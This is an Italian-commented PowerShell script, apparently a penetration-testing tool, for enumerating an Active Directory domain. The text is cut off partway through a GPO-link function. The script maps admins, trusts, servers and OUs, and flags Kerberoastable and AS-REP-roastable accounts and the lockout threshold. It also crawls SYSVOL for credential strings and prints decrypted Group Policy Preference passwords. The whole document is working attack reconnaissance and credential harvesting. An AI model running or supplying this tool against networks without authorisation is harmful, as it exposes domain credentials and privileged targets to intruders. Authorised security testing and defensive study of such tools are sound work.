# AD-Enum.ps1 - Script di Enumerazione Active Directory Completo
# Uso: .\AD-Enum.ps1 oppure Import-Module .\AD-Enum.ps1; Invoke-ADEnum

#region Output System

$script:OutputFile = $null
$script:OutputBuffer = ""

function Write-Both {
    param(
        [string]$Text,
        [string]$Color = "White",
        [switch]$NoNewline
    )

    Write-Host $Text -ForegroundColor $Color -NoNewline:$NoNewline

    if ($script:OutputFile) {
        if ($NoNewline) {
            $script:OutputBuffer += $Text
        } else {
            $line = $script:OutputBuffer + $Text
            $script:OutputBuffer = ""
            Add-Content -Path $script:OutputFile -Value $line
        }
    }
}

#endregion

#region Funzioni Helper

function Write-Banner {
    param([string]$Text)
    $line = "=" * 70
    Write-Both "`n$line" -Color Cyan
    Write-Both "  $Text" -Color Yellow
    Write-Both "$line`n" -Color Cyan
}

function Write-Section {
    param([string]$Text)
    Write-Both "`n[+] $Text" -Color Green
    Write-Both ("-" * 50) -Color DarkGray
}

function Write-SubSection {
    param([string]$Text)
    Write-Both "    [*] $Text" -Color Cyan
}

function Write-Finding {
    param(
        [string]$Label,
        [string]$Value,
        [switch]$Important
    )
    $color = if ($Important) { "Red" } else { "White" }
    Write-Both "        $Label : $Value" -Color $color
}

function Write-Warning {
    param([string]$Text)
    Write-Both "    [!] $Text" -Color Red
}

function Write-Info {
    param([string]$Text)
    Write-Both "    [i] $Text" -Color Magenta
}

function LDAPSearch {
    param (
        [string]$LDAPQuery,
        [string]$SearchBase = $null
    )
    
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    
    if ($SearchBase) {
        $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$SearchBase")
    } else {
        $DistinguishedName = ([adsi]'').distinguishedName
        $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    }
    
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    
    $DirectorySearcher.PageSize = 1000
    $DirectorySearcher.SizeLimit = 0
    $DirectorySearcher.CacheResults = $false
    
    return $DirectorySearcher.FindAll()
}

#endregion

#region Funzioni di Enumerazione Base

function Get-DomainInfo {
    Write-Banner "INFORMAZIONI DOMINIO"
    
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        
        Write-Section "Dominio Corrente"
        Write-Finding "Nome Dominio" $domain.Name
        Write-Finding "Forest" $forest.Name
        Write-Finding "Domain Functional Level" $domain.DomainMode
        Write-Finding "Forest Functional Level" $forest.ForestMode
        Write-Finding "PDC Emulator" $domain.PdcRoleOwner.Name -Important
        
        Write-Section "Domain Controllers"
        foreach ($dc in $domain.DomainControllers) {
            Write-SubSection $dc.Name
            Write-Finding "IP Address" $dc.IPAddress
            Write-Finding "OS Version" $dc.OSVersion
            Write-Finding "Site" $dc.SiteName
        }
        
        Write-Section "Trust Relationships"
        $trusts = $domain.GetAllTrustRelationships()
        if ($trusts.Count -eq 0) {
            Write-Info "Nessun trust relationship trovato"
        } else {
            foreach ($trust in $trusts) {
                Write-SubSection "$($trust.TargetName)"
                Write-Finding "Trust Type" $trust.TrustType
                Write-Finding "Trust Direction" $trust.TrustDirection
            }
        }
    }
    catch {
        Write-Warning "Errore nel recupero info dominio: $_"
    }
}

function Get-DomainUsers {
    Write-Banner "UTENTI DEL DOMINIO"
    
    $users = LDAPSearch -LDAPQuery "(samAccountType=805306368)"
    $userCount = 0
    $adminUsers = @()
    $disabledUsers = @()
    $neverExpirePassword = @()
    $noPreauth = @()
    
    Write-Section "Analisi Utenti"
    
    foreach ($user in $users) {
        $props = $user.Properties
        $username = $props.samaccountname[0]
        $userCount++
        
        # Controlla UAC flags
        $uac = $props.useraccountcontrol[0]
        $isDisabled = ($uac -band 2) -ne 0
        $neverExpires = ($uac -band 65536) -ne 0
        $noKerbPreauth = ($uac -band 4194304) -ne 0
        
        # Categorizza utenti
        if ($isDisabled) { $disabledUsers += $username }
        if ($neverExpires) { $neverExpirePassword += $username }
        if ($noKerbPreauth) { $noPreauth += $username }
        
        # Controlla se admin
        $memberof = $props.memberof
        if ($memberof) {
            foreach ($group in $memberof) {
                if ($group -match "Domain Admins|Enterprise Admins|Administrators|Schema Admins") {
                    $adminUsers += $username
                    break
                }
            }
        }
    }
    
    Write-Finding "Totale Utenti" $userCount

    Write-Section "Lista Completa Utenti (Proprietà Non-Default)"
    $defaultProps = @('adspath','distinguishedname','dscorepropagationdata','instancetype','name','cn','objectcategory','objectclass','objectguid','objectsid','primarygroupid','samaccountname','samaccounttype','useraccountcontrol','usncreated','usnchanged','whenchanged','whencreated','codepage','countrycode','lastlogoff','lastlogon','logoncount','badpwdcount','badpasswordtime','pwdlastset','accountexpires','lastlogontimestamp')

    foreach ($user in $users) {
        $props = $user.Properties
        $username = $props.samaccountname[0]
        $interesting = @{}
        
        foreach ($propName in $props.PropertyNames) {
            if ($propName -notin $defaultProps) {
                $val = $props[$propName][0]
                if ($val -and $val.ToString().Trim()) { $interesting[$propName] = $val }
            }
        }
        
        if ($interesting.Count -gt 0) {
            Write-SubSection $username
            foreach ($k in $interesting.Keys) {
                if ($k -match 'pass|pwd|cred|secret|key|comment|info|script|home|profile' -or $interesting[$k] -match 'pass|pwd|cred|secret|\\\\') {
                    Write-Finding $k $interesting[$k] -Important
                } else {
                    Write-Finding $k $interesting[$k]
                }
            }
        } else {
            Write-Both "    [*] $username" -Color DarkGray
        }
    }
    
    Write-Section "Utenti Privilegiati (IMPORTANTE!)"
    if ($adminUsers.Count -gt 0) {
        foreach ($admin in ($adminUsers | Sort-Object -Unique)) {
            Write-SubSection $admin
            $adminDetails = LDAPSearch -LDAPQuery "(samaccountname=$admin)"
            $groups = $adminDetails.Properties.memberof
            foreach ($g in $groups) {
                if ($g -match "CN=([^,]+)") {
                    $groupName = $matches[1]
                    if ($groupName -match "Admin|Operator|Manager") {
                        Write-Finding "Membro di" $groupName -Important
                    }
                }
            }
        }
    } else {
        Write-Info "Nessun utente admin trovato (strano!)"
    }
    
    Write-Section "Account con Kerberos Pre-Auth Disabilitata (AS-REP Roastable!)"
    if ($noPreauth.Count -gt 0) {
        foreach ($np in $noPreauth) {
            Write-Warning "$np - VULNERABILE AD AS-REP ROASTING!"
        }
    } else {
        Write-Info "Nessun account vulnerabile trovato"
    }
    
    Write-Section "Account con Password che Non Scade Mai"
    if ($neverExpirePassword.Count -gt 0) {
        foreach ($ne in $neverExpirePassword) {
            Write-SubSection $ne
        }
    }
    
    Write-Section "Account Disabilitati"
    if ($disabledUsers.Count -gt 0) {
        foreach ($dis in $disabledUsers) {
            Write-SubSection $dis
        }
    } else {
        Write-Info "Nessun account disabilitato"
    }
}

function Get-DomainGroups {
    Write-Banner "GRUPPI DEL DOMINIO"
    
    $groups = LDAPSearch -LDAPQuery "(objectCategory=group)"
    
    Write-Section "Gruppi Privilegiati"
    
    $privilegedGroups = @(
        "Domain Admins",
        "Enterprise Admins", 
        "Schema Admins",
        "Administrators",
        "Account Operators",
        "Backup Operators",
        "Server Operators",
        "Print Operators",
        "DnsAdmins",
        "Remote Desktop Users",
        "Remote Management Users"
    )
    
    foreach ($privGroup in $privilegedGroups) {
        $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=$privGroup))"
        if ($group) {
            $members = $group.Properties.member
            Write-SubSection "$privGroup"
            if ($members) {
                foreach ($memberDN in $members) {
                    # Recupera samaccountname dal DN del membro
                    $memberObj = LDAPSearch -LDAPQuery "(distinguishedName=$memberDN)"
                    if ($memberObj -and $memberObj.Properties.samaccountname) {
                        $memberName = $memberObj.Properties.samaccountname[0]
                    } elseif ($memberDN -match "CN=([^,]+)") {
                        $memberName = $matches[1]  # Fallback al CN
                    } else {
                        $memberName = $memberDN
                    }
                    Write-Finding "Membro" $memberName -Important
                }
            } else {
                Write-Finding "Membri" "Nessuno"
            }
        }
    }
    
    Write-Section "Gruppi Custom (Non-Default)"
    
    $defaultGroups = @(
        "Domain Admins", "Domain Users", "Domain Computers", "Domain Controllers",
        "Domain Guests", "Enterprise Admins", "Schema Admins", "Administrators",
        "Users", "Guests", "Account Operators", "Backup Operators", "Server Operators",
        "Print Operators", "Replicator", "Remote Desktop Users", "Network Configuration Operators",
        "Performance Monitor Users", "Performance Log Users", "Distributed COM Users",
        "IIS_IUSRS", "Cryptographic Operators", "Event Log Readers", "Certificate Service DCOM Access",
        "RDS Remote Access Servers", "RDS Endpoint Servers", "RDS Management Servers",
        "Hyper-V Administrators", "Access Control Assistance Operators", "Remote Management Users",
        "Storage Replica Administrators", "DnsAdmins", "DnsUpdateProxy", "krbtgt",
        "Cert Publishers", "Enterprise Read-only Domain Controllers", "Read-only Domain Controllers",
        "Cloneable Domain Controllers", "Protected Users", "Key Admins", "Enterprise Key Admins",
        "Allowed RODC Password Replication Group", "Denied RODC Password Replication Group",
        "Group Policy Creator Owners", "RAS and IAS Servers", "Pre-Windows 2000 Compatible Access",
        "Incoming Forest Trust Builders", "Windows Authorization Access Group",
        "Terminal Server License Servers"
    )
    
    foreach ($group in $groups) {
        $groupName = $group.Properties.cn[0]
        if ($groupName -notin $defaultGroups) {
            $members = $group.Properties.member
            Write-SubSection "$groupName"
            if ($members) {
                foreach ($memberDN in $members) {
                    # Recupera samaccountname dal DN del membro
                    $memberObj = LDAPSearch -LDAPQuery "(distinguishedName=$memberDN)"
                    if ($memberObj -and $memberObj.Properties.samaccountname) {
                        $memberName = $memberObj.Properties.samaccountname[0]
                    } elseif ($memberDN -match "CN=([^,]+)") {
                        $memberName = $matches[1]  # Fallback al CN
                    } else {
                        $memberName = $memberDN
                    }
                    Write-Finding "Membro" $memberName
                }
            }
        }
    }
}

function Get-DomainComputers {
    Write-Banner "COMPUTER DEL DOMINIO"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    
    # Helper per risolvere IP da hostname
    function Resolve-HostIP {
        param([string]$Hostname)
        if (-not $Hostname) { return "N/A" }
        try {
            $ips = [System.Net.Dns]::GetHostAddresses($Hostname) | Where-Object { $_.AddressFamily -eq 'InterNetwork' }
            if ($ips) { return ($ips | Select-Object -First 1).IPAddressToString }
            return "N/A"
        }
        catch { return "N/A" }
    }
    
    Write-Section "Domain Controllers"
    $dcs = LDAPSearch -LDAPQuery "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
    foreach ($dc in $dcs) {
        
        $name = if ($dc.Properties.name) { $dc.Properties.name[0] } else { "N/A" }
        $os = if ($dc.Properties.operatingsystem) { $dc.Properties.operatingsystem[0] } else { "N/A" }
        $osVer = if ($dc.Properties.operatingsystemversion) { $dc.Properties.operatingsystemversion[0] } else { "" }
        $dns = if ($dc.Properties.dnshostname) { $dc.Properties.dnshostname[0] } else { $null }
        $ip = Resolve-HostIP -Hostname $dns
        
        Write-SubSection $name
        Write-Finding "DNS" $(if ($dns) { $dns } else { "N/A" })
        Write-Finding "IP" $ip -Important
        Write-Finding "OS" "$os $osVer".Trim() -Important
    }
    
    Write-Section "Server"
    foreach ($computer in $computers) {
        $os = if ($computer.Properties.operatingsystem) { $computer.Properties.operatingsystem[0] } else { $null }
        if ($os -and $os -match "Server" -and $os -notmatch "Domain Controller") {
            $name = if ($computer.Properties.name) { $computer.Properties.name[0] } else { "N/A" }
            $dns = if ($computer.Properties.dnshostname) { $computer.Properties.dnshostname[0] } else { $null }
            $osVer = if ($computer.Properties.operatingsystemversion) { $computer.Properties.operatingsystemversion[0] } else { "" }
            $ip = Resolve-HostIP -Hostname $dns
            
            Write-SubSection $name
            Write-Finding "DNS" $(if ($dns) { $dns } else { "N/A" })
            Write-Finding "IP" $ip -Important
            Write-Finding "OS" "$os $osVer".Trim()
        }
    }
    
    Write-Section "Workstation"
    foreach ($computer in $computers) {
        $os = if ($computer.Properties.operatingsystem) { $computer.Properties.operatingsystem[0] } else { $null }
        if (-not $os -or $os -notmatch "Server") {
            $name = if ($computer.Properties.name) { $computer.Properties.name[0] } else { "N/A" }
            $dns = if ($computer.Properties.dnshostname) { $computer.Properties.dnshostname[0] } else { $null }
            $osVer = if ($computer.Properties.operatingsystemversion) { $computer.Properties.operatingsystemversion[0] } else { "" }
            $ip = Resolve-HostIP -Hostname $dns

            Write-SubSection $name
            Write-Finding "DNS" $(if ($dns) { $dns } else { "N/A" })
            Write-Finding "IP" $ip
            Write-Finding "OS" $(if ($os) { "$os $osVer".Trim() } else { "N/A" })
        }
    }
}

function Get-OrganizationalUnits {
    Write-Banner "ORGANIZATIONAL UNITS"
    
    Write-Section "Struttura OU del dominio"
    
    $DN = ([adsi]'').distinguishedName
    $ous = LDAPSearch -LDAPQuery "(objectCategory=organizationalUnit)"
    
    # Costruisci struttura gerarchica
    $ouList = @()
    
    foreach ($ou in $ous) {
        $ouDN = $ou.Properties.distinguishedname[0]
        $ouName = $ou.Properties.name[0]
        $ouDesc = $ou.Properties.description[0]
        $gpLink = $ou.Properties.gplink[0]
        
        # Calcola profondità (conta le virgole per determinare il livello)
        $depth = ($ouDN.ToCharArray() | Where-Object { $_ -eq ',' }).Count
        $depth = $depth - ($DN.ToCharArray() | Where-Object { $_ -eq ',' }).Count
        
        # Conta oggetti nella OU
        $userCount = 0
        $computerCount = 0
        $groupCount = 0
        
        try {
            $usersInOU = LDAPSearch -LDAPQuery "(&(objectCategory=person)(objectClass=user))" -SearchBase $ouDN
            $userCount = @($usersInOU).Count
        } catch {}
        
        try {
            $computersInOU = LDAPSearch -LDAPQuery "(objectCategory=computer)" -SearchBase $ouDN
            $computerCount = @($computersInOU).Count
        } catch {}
        
        try {
            $groupsInOU = LDAPSearch -LDAPQuery "(objectCategory=group)" -SearchBase $ouDN
            $groupCount = @($groupsInOU).Count
        } catch {}
        
        # Parse GPO linkate
        $linkedGPOs = @()
        if ($gpLink) {
            $matches = [regex]::Matches($gpLink, '\[LDAP://[cC][nN]=(\{[0-9a-fA-F-]+\}),[^;]+;(\d)\]')
            foreach ($match in $matches) {
                $guid = $match.Groups[1].Value
                $linkedGPOs += $guid
            }
        }
        
        $ouList += [PSCustomObject]@{
            Name = $ouName
            DN = $ouDN
            Description = $ouDesc
            Depth = $depth
            Users = $userCount
            Computers = $computerCount
            Groups = $groupCount
            GPOCount = $linkedGPOs.Count
            GPOs = $linkedGPOs
        }
    }
    
    # Ordina per DN per avere struttura gerarchica
    $ouList = $ouList | Sort-Object -Property DN
    
    # Output struttura
    Write-Section "ALBERO OU ($($ouList.Count) trovate)"
    
    foreach ($ou in $ouList) {
        $indent = "    " * $ou.Depth
        $stats = "U:$($ou.Users) C:$($ou.Computers) G:$($ou.Groups)"
        $gpoInfo = if ($ou.GPOCount -gt 0) { " [GPO:$($ou.GPOCount)]" } else { "" }
        
        # Evidenzia OU interessanti
        $color = "White"
        if ($ou.Name -match 'Admin|Privileged|Tier|PAW|Service|Server|Domain Controller') {
            $color = "Red"
        } elseif ($ou.Name -match 'Workstation|Desktop|Client|User') {
            $color = "Yellow"
        } elseif ($ou.Name -match 'Disabled|Inactive|Old') {
            $color = "DarkGray"
        }
        
        Write-Both "$indent[OU] $($ou.Name) ($stats)$gpoInfo" -Color $color
    }
    
    # OU interessanti per pentest
    Write-Section "OU INTERESSANTI PER PENTEST"
    
    $interestingPatterns = @(
        @{ Pattern = 'Admin|Privileged|Tier0|Tier1|PAW'; Reason = "Account privilegiati" },
        @{ Pattern = 'Service|SVC|Svc'; Reason = "Service accounts (spesso Kerberoastable)" },
        @{ Pattern = 'Server|Servers'; Reason = "Server - target per lateral movement" },
        @{ Pattern = 'Workstation|Desktop|Client'; Reason = "Workstation utenti" },
        @{ Pattern = 'Disabled|Inactive|Old|Archive'; Reason = "Account disabilitati (potrebbero essere riattivabili)" },
        @{ Pattern = 'Test|Dev|Lab'; Reason = "Ambienti test (spesso meno protetti)" },
        @{ Pattern = 'Vendor|External|Contractor'; Reason = "Account esterni" }
    )
    
    foreach ($pattern in $interestingPatterns) {
        $matchingOUs = $ouList | Where-Object { $_.Name -match $pattern.Pattern }
        
        if ($matchingOUs.Count -gt 0) {
            Write-SubSection "$($pattern.Reason)"
            foreach ($ou in $matchingOUs) {
                Write-Finding $ou.Name "U:$($ou.Users) C:$($ou.Computers) G:$($ou.Groups)"
            }
        }
    }
    
    # OU con più oggetti
    Write-Section "OU CON PIÙ OGGETTI"
    
    Write-SubSection "Top 5 per Utenti"
    $topUsers = $ouList | Sort-Object -Property Users -Descending | Select-Object -First 5
    foreach ($ou in $topUsers) {
        if ($ou.Users -gt 0) {
            Write-Finding $ou.Name "$($ou.Users) utenti"
        }
    }
    
    Write-SubSection "Top 5 per Computer"
    $topComputers = $ouList | Sort-Object -Property Computers -Descending | Select-Object -First 5
    foreach ($ou in $topComputers) {
        if ($ou.Computers -gt 0) {
            Write-Finding $ou.Name "$($ou.Computers) computer"
        }
    }
    
    # OU con GPO (potenziali target per GPO abuse)
    Write-Section "OU CON GPO LINKATE"
    $ousWithGPO = $ouList | Where-Object { $_.GPOCount -gt 0 } | Sort-Object -Property GPOCount -Descending
    
    foreach ($ou in $ousWithGPO) {
        Write-SubSection "$($ou.Name) ($($ou.GPOCount) GPO)"
        Write-Finding "DN" $ou.DN
        Write-Finding "Oggetti" "U:$($ou.Users) C:$($ou.Computers) G:$($ou.Groups)"
    }
    
    if ($ousWithGPO.Count -eq 0) {
        Write-Info "Nessuna OU con GPO linkate direttamente"
    }
}

function Get-SPNs {
    Write-Banner "SERVICE PRINCIPAL NAMES (Kerberoastable)"
    
    $spnUsers = LDAPSearch -LDAPQuery "(&(samAccountType=805306368)(servicePrincipalName=*))"
    
    Write-Section "Account Utente con SPN (Kerberoastable!)"
    
    $found = $false
    foreach ($user in $spnUsers) {
        $username = $user.Properties.samaccountname[0]
        
        if ($username -eq "krbtgt") { continue }
        
        $found = $true
        $spns = $user.Properties.serviceprincipalname
        $pwdLastSet = [datetime]::FromFileTime([int64]$user.Properties.pwdlastset[0])
        
        Write-Warning "$username - VULNERABILE A KERBEROASTING!"
        Write-Finding "Password Last Set" $pwdLastSet
        
        foreach ($spn in $spns) {
            Write-Finding "SPN" $spn -Important
        }
        Write-Both ""
    }
    
    if (-not $found) {
        Write-Info "Nessun account utente con SPN trovato"
    }
}

function Get-PasswordPolicy {
    Write-Banner "PASSWORD POLICY"
    
    try {
        $policy = Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue
        
        Write-Section "Policy Password Dominio"
        Write-Finding "Lunghezza Minima" $policy.MinPasswordLength
        Write-Finding "Cronologia Password" $policy.PasswordHistoryCount
        Write-Finding "Età Massima Password" $policy.MaxPasswordAge
        Write-Finding "Età Minima Password" $policy.MinPasswordAge
        Write-Finding "Complessità Richiesta" $policy.ComplexityEnabled
        Write-Finding "Lockout Threshold" $policy.LockoutThreshold -Important
        Write-Finding "Lockout Duration" $policy.LockoutDuration
        Write-Finding "Lockout Observation Window" $policy.LockoutObservationWindow
    }
    catch {
        Write-Section "Policy Password (via net accounts)"
        $netAccounts = net accounts /domain 2>&1
        foreach ($line in $netAccounts) {
            if ($line -match ":") {
                Write-Both "        $line" -Color White
            }
        }
    }
}

function Get-GPOs {
    Write-Banner "GROUP POLICY OBJECTS"
    
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domainName = $domain.Name
    $PDC = $domain.PdcRoleOwner.Name
    
    #region GPO da LDAP
    Write-Section "GPO nel Dominio (LDAP)"
    
    try {
        $gpos = LDAPSearch -LDAPQuery "(objectCategory=groupPolicyContainer)"
        $gpoCount = 0
        
        foreach ($gpo in $gpos) {
            $name = $gpo.Properties.displayname[0]
            $path = $gpo.Properties.gpcfilesyspath[0]
            $guid = $gpo.Properties.cn[0]
            
            Write-SubSection $name
            Write-Finding "GUID" $guid
            Write-Finding "Path" $path
            $gpoCount++
        }
        Write-Both ""
        Write-Info "Totale GPO trovate: $gpoCount"
    }
    catch {
        Write-Warning "Impossibile enumerare GPO via LDAP: $_"
    }
    #endregion
    
    #region Scan SYSVOL
    Write-Section "Scansione SYSVOL per file sensibili"
    
    $sysvolPath = "\\$domainName\SYSVOL\$domainName"
    $policiesPath = "$sysvolPath\Policies"
    $scriptsPath = "$sysvolPath\scripts"
    
    # Pattern per trovare credenziali nei file
    $sensitivePatterns = @(
        'cpassword',
        'password\s*=',
        'passwd\s*=',
        'pwd\s*=',
        'credential',
        'secret',
        'connectionstring',
        'net use.*/user:',
        'runas\s+/user:'
    )
    
    $gppPasswords = @()
    $sensitiveFindings = @()
    $scriptsFound = @()
    $allFilesFound = @()
    
    # Test accesso a SYSVOL
    Write-SubSection "Test accesso SYSVOL"
    if (-not (Test-Path $sysvolPath -ErrorAction SilentlyContinue)) {
        Write-Warning "Impossibile accedere a SYSVOL: $sysvolPath"
        return
    }
    Write-Finding "SYSVOL" "Accessibile"
    
    # Scan TUTTO SYSVOL (non solo Policies)
    Write-SubSection "Scansione completa SYSVOL..."
    
    try {
        # Cerca TUTTI i file ricorsivamente
        $allFiles = Get-ChildItem -Path $sysvolPath -Recurse -File -ErrorAction SilentlyContinue
        
        Write-Finding "File totali trovati" $allFiles.Count
        
        foreach ($file in $allFiles) {
            $fileName = $file.Name
            $filePath = $file.FullName
            $fileExt = $file.Extension.ToLower()
            
            # Salva tutti i file trovati
            $allFilesFound += [PSCustomObject]@{
                Name = $fileName
                Path = $filePath
                Size = $file.Length
                LastModified = $file.LastWriteTime
                Extension = $fileExt
            }
            
            # Controlla TUTTI i file XML per cpassword (non solo Groups.xml)
            if ($fileExt -eq '.xml') {
                try {
                    $content = Get-Content $filePath -Raw -ErrorAction Stop
                    
                    # Cerca cpassword in QUALSIASI file XML
                    if ($content -match 'cpassword\s*=\s*"([^"]+)"') {
                        $cpassword = $matches[1]
                        
                        # Cerca userName
                        $userName = ""
                        if ($content -match 'userName\s*=\s*"([^"]+)"') {
                            $userName = $matches[1]
                        }
                        elseif ($content -match 'accountName\s*=\s*"([^"]+)"') {
                            $userName = $matches[1]
                        }
                        elseif ($content -match 'runAs\s*=\s*"([^"]+)"') {
                            $userName = $matches[1]
                        }
                        
                        # Decripta GPP password
                        $decrypted = Decrypt-GPPPassword -Cpassword $cpassword
                        
                        $gppPasswords += [PSCustomObject]@{
                            File = $filePath
                            FileName = $fileName
                            UserName = $userName
                            CPassword = $cpassword
                            DecryptedPassword = $decrypted
                        }
                    }
                    
                    # Cerca anche altri pattern sensibili in XML
                    foreach ($pattern in $sensitivePatterns) {
                        if ($pattern -eq 'cpassword') { continue }  # Già gestito sopra
                        
                        if ($content -imatch $pattern) {
                            $lines = $content -split "`n"
                            foreach ($line in $lines) {
                                if ($line -imatch $pattern -and $line.Trim().Length -gt 0 -and $line.Length -lt 500) {
                                    $sensitiveFindings += [PSCustomObject]@{
                                        File = $filePath
                                        FileName = $fileName
                                        Pattern = $pattern
                                        Line = $line.Trim().Substring(0, [Math]::Min(150, $line.Trim().Length))
                                    }
                                }
                            }
                            break
                        }
                    }
                }
                catch {}
            }
            
            # Controlla script e file di testo per credenziali
            if ($fileExt -match '^\.(ps1|vbs|bat|cmd|txt|ini|config|cfg|conf)$') {
                $scriptsFound += [PSCustomObject]@{
                    Name = $fileName
                    Path = $filePath
                    Size = $file.Length
                    LastModified = $file.LastWriteTime
                }
                
                try {
                    $content = Get-Content $filePath -Raw -ErrorAction Stop
                    
                    foreach ($pattern in $sensitivePatterns) {
                        if ($content -imatch $pattern) {
                            $lines = $content -split "`n"
                            foreach ($line in $lines) {
                                if ($line -imatch $pattern -and $line.Trim().Length -gt 0 -and $line.Length -lt 500) {
                                    $sensitiveFindings += [PSCustomObject]@{
                                        File = $filePath
                                        FileName = $fileName
                                        Pattern = $pattern
                                        Line = $line.Trim().Substring(0, [Math]::Min(150, $line.Trim().Length))
                                    }
                                }
                            }
                            break
                        }
                    }
                }
                catch {}
            }
        }
    }
    catch {
        Write-Warning "Errore scansione SYSVOL: $_"
    }
    #endregion
    
    #region Output risultati
    
    # GPP Passwords trovate
    if ($gppPasswords.Count -gt 0) {
        Write-Section "GPP PASSWORDS TROVATE! (CRITICO)"
        
        foreach ($gpp in $gppPasswords) {
            Write-Warning "Password GPP trovata in: $($gpp.FileName)"
            Write-Finding "Path completo" $gpp.File -Important
            if ($gpp.UserName) {
                Write-Finding "Username" $gpp.UserName -Important
            }
            Write-Finding "CPassword" $gpp.CPassword
            Write-Finding "Password decrittata" $gpp.DecryptedPassword -Important
            Write-Both ""
        }
    }
    
    # File con potenziali credenziali
    if ($sensitiveFindings.Count -gt 0) {
        Write-Section "POTENZIALI CREDENZIALI IN FILE ($($sensitiveFindings.Count) occorrenze)"
        
        # Raggruppa per file e rimuovi duplicati
        $groupedFindings = $sensitiveFindings | Group-Object -Property File
        
        foreach ($group in $groupedFindings) {
            $fileName = Split-Path $group.Name -Leaf
            Write-Warning "$fileName"
            Write-Finding "Path" $group.Name
            
            $uniqueFindings = $group.Group | Select-Object -Property Pattern, Line -Unique | Select-Object -First 5
            foreach ($finding in $uniqueFindings) {
                Write-Both "        [$($finding.Pattern)] $($finding.Line)" -Color White
            }

            if ($group.Group.Count -gt 5) {
                Write-Both "        ... e altre $($group.Group.Count - 5) occorrenze" -Color DarkGray
            }
            Write-Both ""
        }
    }
    
    # Script trovati
    if ($scriptsFound.Count -gt 0) {
        Write-Section "Script e file di configurazione ($($scriptsFound.Count) trovati)"
        
        foreach ($script in ($scriptsFound | Select-Object -First 15)) {
            Write-Both "    [*] $($script.Name) ($($script.Size) bytes)" -Color White
            Write-Both "        $($script.Path)" -Color Gray
        }
        
        if ($scriptsFound.Count -gt 15) {
            Write-Both ""
            Write-Info "... e altri $($scriptsFound.Count - 15) file"
        }
        
        Write-Both ""
        Write-Info "Controlla manualmente questi file per credenziali hardcoded!"
    }
    
    # Riepilogo
    if ($gppPasswords.Count -eq 0 -and $sensitiveFindings.Count -eq 0) {
        Write-Section "Riepilogo"
        Write-Info "Nessuna credenziale trovata automaticamente in SYSVOL"
    }
    #endregion
}

function Get-GPOLinks {
    Write-Banner "GPO LINKS"
    
    Write-Section "Mapping GPO -> Dove sono linkate"
    Write-Info "Cerca link su: Domain, OU, Sites"
    Write-Both ""
    
    $DN = ([adsi]'').distinguishedName
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    
    # Dizionario GPO GUID -> Nome
    $gpoNames = @{}
    $gpos = LDAPSearch -LDAPQuery "(objectCategory=groupPolicyContainer)"
    foreach ($gpo in $gpos) {
        $guid = $gpo.Properties.cn[0]
        $name = $gpo.Properties.displayname[0]
        $gpoNames[$guid.ToLower()] = $name
    }
    
    # Trova tutti gli oggetti con gpLink (OU, Domain, Sites)
    $linkedObjects = @()
    
    # Domain root
    Write-SubSection "Analisi Domain Root..."
    try {
        $domainObj = [ADSI]"LDAP://$PDC/$DN"
        $gpLink = $domainObj.Properties["gpLink"].Value
        if ($gpLink) {
            $linkedObjects += [PSCustomObject]@{
                Target = "DOMAIN: $DN"
                TargetType = "Domain"
                GPLink = $gpLink
                DN = $DN
            }
        }
    } catch {}
    
    # Organizational Units
    Write-SubSection "Analisi Organizational Units..."
    $ous = LDAPSearch -LDAPQuery "(objectCategory=organizationalUnit)"
    foreach ($ou in $ous) {
        $ouDN = $ou.Properties.distinguishedname[0]
        $ouName = $ou.Properties.name[0]
        $gpLink = $ou.Properties.gplink[0]
        
        if ($gpLink) {
            $linkedObjects += [PSCustomObject]@{
                Target = $ouName
                TargetType = "OU"
                GPLink = $gpLink
                DN = $ouDN
            }
        }
    }
    
    # Sites (in Configuration partition)
    Write-SubSection "Analisi Sites..."
    try {
        $configDN = "CN=Configuration,$DN"
        $sites = LDAPSearch -LDAPQuery "(objectClass=site)" -SearchBase "CN=Sites,$configDN"
        foreach ($site in $sites) {
            $siteDN = $site.Properties.distinguishedname[0]
            $siteName = $site.Properties.name[0]
            $gpLink = $site.Properties.gplink[0]
            
            if ($gpLink) {
                $linkedObjects += [PSCustomObject]@{
                    Target = $siteName
                    TargetType = "Site"
                    GPLink = $gpLink
                    DN = $siteDN
                }
            }
        }
    } catch {}
    
    # Parse gpLink e mostra risultati
    # Formato gpLink: [LDAP://cn={GUID},cn=policies,cn=system,DC=...;0][LDAP://...;0]
    # ;0 = Enabled, ;1 = Disabled, ;2 = Enforced
    
    $gpoLinkMap = @{}  # GPO -> Lista di target
    
    foreach ($obj in $linkedObjects) {
        $gpLink = $obj.GPLink
        
        # Regex per estrarre GUID delle GPO
        $matches = [regex]::Matches($gpLink, '\[LDAP://[cC][nN]=(\{[0-9a-fA-F-]+\}),[^;]+;(\d)\]')
        
        foreach ($match in $matches) {
            $guid = $match.Groups[1].Value.ToLower()
            $linkStatus = $match.Groups[2].Value
            
            $statusText = switch ($linkStatus) {
                "0" { "Enabled" }
                "1" { "Disabled" }
                "2" { "Enforced" }
                default { "Unknown" }
            }
            
            $gpoName = if ($gpoNames[$guid]) { $gpoNames[$guid] } else { $guid }
            
            if (-not $gpoLinkMap.ContainsKey($gpoName)) {
                $gpoLinkMap[$gpoName] = @()
            }
            
            $gpoLinkMap[$gpoName] += [PSCustomObject]@{
                Target = $obj.Target
                TargetType = $obj.TargetType
                TargetDN = $obj.DN
                Status = $statusText
            }
        }
    }
    
    # Output per GPO
    Write-Section "GPO E RELATIVI LINK"

    foreach ($gpoName in ($gpoLinkMap.Keys | Sort-Object)) {
        $links = $gpoLinkMap[$gpoName]

        Write-SubSection "$gpoName"

        foreach ($link in $links) {
            $statusColor = switch ($link.Status) {
                "Enabled" { "Green" }
